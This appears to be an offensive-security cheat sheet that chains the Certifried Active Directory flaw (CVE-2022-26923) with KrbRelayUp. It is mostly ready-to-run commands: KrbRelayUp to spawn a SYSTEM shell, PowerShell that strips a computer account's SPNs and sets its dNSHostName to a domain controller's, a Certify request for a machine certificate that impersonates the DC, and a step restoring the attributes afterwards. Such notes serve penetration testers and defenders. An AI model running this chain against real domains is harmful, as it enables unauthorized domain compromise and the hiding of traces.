### Certifried combined with KrbRelayUp

### Prerequisites
```
WriteACL on computeraccount
Existence of machine certificate template
```

### Start SYSTEM cmd shell
```
KrbRelayUp.exe full -m shadowcred -f
```

### Remove SPNs and modify dNSHostName to a DC (save original values in variables $spn and $dns)
```
$searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]'')
$searcher.filter = '(&(objectClass=computer)(sAMAccountName={0}$))' -f $Env:ComputerName
$obj = [ADSI]$searcher.FindAll().Path
$spn = @()
$obj.servicePrincipalName | % { $spn += $_ }
$dns = $obj.dNSHostName.ToString()     
$spn | % { $obj.servicePrincipalName.Remove($_) }
$obj.dNSHostName = "<domainControllerFqdn"
$obj.SetInfo()
```

### Request certificate using abused computer
```
.\Certify.exe request /ca:<domainControllerFqdn>\<certificateAuthority> /machine
```

### Restore computer attributes
```
$obj.dNSHostName = $dns
$spn | % { $obj.servicePrincipalName.Add($_) }
$obj.SetInfo()
```

### References
* https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4
* https://gist.github.com/tothi/f89a37127f2233352d74eef6c748ca25
* https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923

